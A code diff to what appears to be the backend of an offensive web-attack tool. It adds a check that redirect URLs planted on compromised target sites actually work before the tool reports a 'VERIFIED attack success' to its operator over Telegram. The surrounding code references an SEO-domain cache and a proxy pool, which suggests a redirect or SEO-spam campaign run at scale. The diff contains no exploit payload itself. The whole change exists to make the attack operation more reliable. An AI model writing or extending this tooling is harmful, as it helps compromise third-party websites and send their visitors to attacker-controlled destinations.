@@ -11,6 +11,7 @@
 
 import { ENV } from "./_core/env";
 import { fetchWithPoolProxy } from "./proxy-pool";
+import { shouldSendNotification as verifyRedirectBeforeSend } from "./redirect-verifier";
 
 // Dynamic SEO domain cache — refreshed periodically
 let seoDomainsCache: Set<string> = new Set();
@@ -363,8 +364,40 @@ export async function sendTelegramNotification(
     // Non-critical — continue sending if DB check fails
   }
 
-  // If we get here, it's a real attack success — send it!
-  console.log(`[Telegram] ✅ Sending REAL attack success for ${notification.targetUrl}`);
+  // ═══ REDIRECT VERIFICATION GATE ═══
+  // Before sending, verify that deployed URLs actually work and redirect correctly
+  if (hasDeployedUrls) {
+    try {
+      console.log(`[Telegram] Verifying ${notification.deployedUrls!.length} deployed URL(s) before sending...`);
+      const verification = await verifyRedirectBeforeSend(
+        notification.deployedUrls!,
+        notification.redirectUrl || null,
+      );
+
+      if (!verification.shouldSend) {
+        console.log(`[Telegram] ❌ Redirect verification FAILED for ${notification.targetUrl} — ${verification.verificationSummary}`);
+        console.log(`[Telegram] Blocking notification: 0/${verification.totalCount} URLs verified`);
+        return { success: true }; // Silently block — don't send unverified attacks
+      }
+
+      console.log(`[Telegram] ✅ Redirect verification PASSED: ${verification.verifiedCount}/${verification.totalCount} URLs verified`);
+      
+      // Enrich the notification with verification data
+      if (verification.redirectChainText) {
+        notification.details = [
+          notification.details || "",
+          `\n🔍 Redirect Verified: ${verification.verifiedCount}/${verification.totalCount}`,
+          verification.redirectChainText,
+        ].filter(Boolean).join("\n");
+      }
+    } catch (verifyErr: any) {
+      // Verification engine error — still send the notification but log warning
+      console.warn(`[Telegram] ⚠️ Redirect verification error (sending anyway): ${verifyErr.message}`);
+    }
+  }
+
+  // If we get here, it's a real, verified attack success — send it!
+  console.log(`[Telegram] ✅ Sending VERIFIED attack success for ${notification.targetUrl}`);
 
   // Only success type reaches here (all others are filtered above)
   const message = formatSuccessMessage(notification);
